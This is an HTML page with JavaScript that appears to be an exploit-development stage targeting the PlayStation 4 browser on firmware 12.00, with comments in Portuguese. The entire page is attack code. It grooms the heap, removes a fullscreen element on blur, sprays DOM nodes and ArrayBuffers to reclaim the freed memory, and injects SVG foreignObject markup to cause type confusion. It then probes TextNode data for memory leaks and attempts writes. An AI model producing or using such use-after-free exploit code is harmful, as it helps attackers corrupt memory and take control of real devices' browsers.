<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Leak Stage (TextNode)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → Type Confusion → Leak Stage</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg){
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP
function setupHeap(){
    let arr=[];
    for(let i=0;i<5000;i++){
        let a=new Float64Array(8);
        a[0]=i;
        arr.push(a);
    }
    return arr;
}

// ==========================
// FULLSCREEN
function setupFullscreen(){
    let fsTarget=document.createElement("div");

    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    Object.assign(fsTarget.style,{
        background:"black",
        width:"100%",
        height:"100%",
        position:"absolute",
        top:"0",
        left:"0"
    });

    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 💣 RECLAIM (MAIS PRESSÃO)
function reclaim(size){
    log("[*] Reclaim size = " + size);

    // churn
    for(let i=0;i<3000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }

    // DOM spray
    for(let i=0;i<size;i++){
        let e=document.createElement("div");
        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
        document.body.appendChild(e);
    }

    // 🔥 ArrayBuffer spray (mais forte)
    let ab=[];
    for(let i=0;i<12000;i++){
        let b=new ArrayBuffer(0x40);
        let v=new Uint8Array(b);

        v[0]=0x41;
        v[1]=0x41;
        v[2]=0x41;
        v[3]=0x41;

        ab.push(v);
    }
}

// ==========================
// 💥 SVG CONFUSION
function inject(child){
    try{
        child.outerHTML = `
        <svg>
            <foreignObject width="100%" height="100%">
                <div xmlns="http://www.w3.org/1999/xhtml">
                    AAAA
                </div>
            </foreignObject>
        </svg>`;
        log("[*] payload injected");
    }catch(e){
        log("[UAF] inject crash");
    }
}

// ==========================
// 🔬 LEAK + WRITE PROBE
function probe(fsTarget){
    log("---- PROBE ----");

    try{
        let n = fsTarget.firstChild;

        log("[CHECK] node = " + n);
        if(!n) return;

        log("[CHECK] nodeType = " + n.nodeType);

        // 🎯 FOCO: TextNode
        if(n.nodeType === 3){

            log("[!!!] TEXTNODE DETECTADO");

            try{
                let data = n.data;

                log("[LEAK] data = " + data);

                // heurística de leak
                if(data && (
                    data.length > 20 ||
                    data.includes("AAAA") ||
                    data.includes("\u0000")
                )){
                    log("[!!!] POSSIVEL LEAK REAL");
                }

            }catch(e){
                log("[LEAK] crash leitura");
            }

            // 💣 tentativa de write
            try{
                n.data = "BBBBBBBBBBBBBBBBBBBBBBBB";
                log("[PWN] write data OK");
            }catch(e){
                log("[UAF] write crash");
            }

        } else {

            log("[INFO] nao virou TextNode");

        }

        // 🔥 acesso genérico (pode crashar)
        try{
            let r = n.getBoundingClientRect();
            log("[CHECK] rect OK");
        }catch(e){
            log("[UAF] rect crash");
        }

    }catch(e){
        log("[UAF] probe crash geral");
    }
}

// ==========================
// TRIGGER (INTACTO)
function trigger(fsTarget){
    log("[*] Trigger");

    try{
        fsTarget.remove();

        if(document.webkitIsFullScreen || document.fullscreenElement){
            document.webkitExitFullscreen?.();
        }

    }catch(e){
        log("[ERRO]");
    }

    let sizes=[1500,2000,2500,3000];

    sizes.forEach((s,i)=>{
        setTimeout(()=>reclaim(s), i*50);
    });

    // janela crítica
    setTimeout(()=>{
        try{
            let child = fsTarget.firstChild;
            if(child) inject(child);
        }catch(e){}
    }, 30);

    // probes
    setTimeout(()=>probe(fsTarget), 80);
    setTimeout(()=>probe(fsTarget), 160);
    setTimeout(()=>probe(fsTarget), 240);

    // dump
    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    }, 400);

    // ⚠️ NÃO ALTERAR
    setTimeout(()=>location.reload(), 500);
}

// ==========================
// MAIN
function runTest(){
    log("[*] Iniciando teste");

    let heap=setupHeap();
    let fsTarget=setupFullscreen();

    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
